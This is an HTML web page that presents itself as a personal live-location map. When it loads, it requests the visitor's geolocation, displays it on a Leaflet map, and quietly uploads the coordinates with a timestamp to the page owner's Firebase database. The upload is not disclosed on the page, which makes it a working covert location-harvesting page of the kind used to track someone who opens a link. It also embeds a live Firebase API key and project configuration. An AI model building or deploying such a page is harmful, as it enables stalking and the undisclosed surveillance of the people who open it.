<!DOCTYPE html>
<html>
<head>

<title>Live Location Tracker</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body{
font-family: Arial;
background:#f4f6fb;
margin:0;
text-align:center;
}

header{
background:#ff4b5c;
color:white;
padding:20px;
font-size:28px;
}

#map{
height:420px;
width:90%;
margin:auto;
margin-top:20px;
border-radius:10px;
}

.info{
margin-top:15px;
font-size:18px;
}

</style>

</head>

<body>

<header>
📍 My Live Location
</header>

<div class="info" id="status">Please Wait....</div>

<div id="map"></div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.firebasestorage.app",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6",
measurementId: "G-7W31D4YSB7"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8103,90.4125],10);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
maxZoom:19
}).addTo(map);

var marker;

function getLocation(){

if(navigator.geolocation){

navigator.geolocation.getCurrentPosition(async function(position){

let lat = position.coords.latitude;
let lon = position.coords.longitude;

document.getElementById("status").innerHTML =
"Latitude: "+lat+" | Longitude: "+lon;

map.setView([lat,lon],15);

marker = L.marker([lat,lon]).addTo(map)
.bindPopup("Your Location")
.openPopup();

await addDoc(collection(db,"locations"),{
latitude:lat,
longitude:lon,
time:new Date().toISOString()
});

});

}

}

getLocation();

</script>

</body>
</html>
